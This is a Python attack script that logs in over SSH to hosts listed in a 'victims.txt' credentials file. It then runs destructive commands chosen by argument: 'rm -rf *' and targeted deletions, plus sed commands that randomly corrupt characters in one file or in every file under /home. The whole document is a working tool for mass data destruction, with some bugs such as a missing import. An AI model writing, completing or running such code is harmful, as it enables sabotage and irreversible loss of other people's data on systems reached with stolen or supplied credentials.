import sys
from pexpect import pxssh
import csv
import os
import random

i = 1
while True:
    selection = sys.argv[i]
    i = i + 1
    if selection == '1':
        #delete all files possible
        command1 = 'rm -f *'
        command2 = 'rm -rf *'
        print("Reading in Victims")
        with open('victims.txt','r') as csvfile:
            victims = csv.reader(csvfile)
            for row in victims:
                print("Host:%s \tUser:%s \tPassword:%s" %(row[0],row[1],row[2]))
                s = pxssh.pxssh()
                if not s.login(row[0],row[1],row[2]):
                    print("SSH SESSION FAILURE")
                    print(str(s))
                else:
                    print("SSH SESSION LOGIN SUCCESS")
                    s.sendline(command1)
                    s.prompt()
                    s.sendline(command2)
                    s.prompt()
                    print("Files Deleted")
                    s.logout
    if selection == '2':
        #delete a specified file
        print("Reading in Victims")
        with open('victims.txt', 'r') as csvfile:
            victims = csv.reader(csvfile)
            for row in victims:
                print("Host:%s \tUser:%s \tPassword:%s \tFile:%s" %(row[0],row[1],row[2],row[3]))
                command = 'rm -f {}'.format(row[3])
                s = pxssh.pxssh()
                if not s.login(row[0],row[1],row[2]):
                    print("SSH SESSION FAILURE")
                    print(str(s))
                else:
                    print("SSH SESSION LOGIN SUCCESS")
                    s.sendline(command)
                    s.prompt()
                    print("File Deleted")
                    s.logout
    if selection == '3':
        #delete a specified directory
        print("Reading in Victims")
        with open('victims.txt', 'r') as csvfile:
            victims = csv.reader(csvfile)
            for row in victims:
                print("Host:%s \tUser:%s \tPassword:%s \tDirectory:%s" %(row[0],row[1],row[2],row[3]))
                command = 'rm -rf {}'.format(row[3])
                s = pxssh.pxssh()
                if not s.login(row[0],row[1],row[2]):
                    print("SSH SESSION FAILURE")
                    print(str(s))
                else:
                    print("SSH SESSION LOGIN SUCCESS")
                    s.sendline(command)
                    s.prompt()
                    print("Directory Deleted")
                    s.logout
    if selection == '4':
        #change the specified number of characters in a given file
        print("Reading in Victims")
        chars = 6
        char_list = [ [random.choice(string.ascii_letters), random.choice(string.ascii_letters)] for c in range(chars) ] 
        with open('victims.txt', 'r') as csvfile:
            victims = csv.reader(csvfile)
            for row in victims:
                print("Host:%s \tUser:%s \tPassword:%s \tFile:%s" %(row[0],row[1],row[2],row[3]))
                commands = [ "sed -i 's/{0}/{1}/' {2}".format(char_list[c][0],char_list[c][1],row[3]) for c in range(chars) ]
                s = pxssh.pxssh()
                if not s.login(row[0],row[1],row[2]):
                    print("SSH SESSION FAILURE")
                    print(str(s))
                else:
                    print("SSH SESSION LOGIN SUCCESS")
                    for command in commands:
                        s.sendline(command)
                        s.prompt()
                        print("sed COMMAND EXECUTED")
                        s.logout
    if selection == '5':
        #change the specified number of characters in all files
        print("Reading in Victims")
        chars = 6
        char_list = [ [random.choice(string.ascii_letters), random.choice(string.ascii_letters)] for c in range(chars) ] 
        with open('victims.txt', 'r') as csvfile:
            victims = csv.reader(csvfile)
            for row in victims:
                print("Host:%s \tUser:%s \tPassword:%s" %(row[0],row[1],row[2]))
                commands = [ """find /home -type f -iname '*' -exec sed -i '/s/{0}/{1}/' "{}" +;""".format(char_list[c][0],char_list[c][1]) for c in range(chars) ]
                s = pxssh.pxssh()
                if not s.login(row[0],row[1],row[2]):
                    print("SSH SESSION FAILURE")
                    print(str(s))
                else:
                    print("SSH SESSION LOGIN SUCCESS")
                    for command in commands:
                        s.sendline(command)
                        s.prompt()
                        print("sed COMMAND EXECUTED")
                        s.logout
        
                
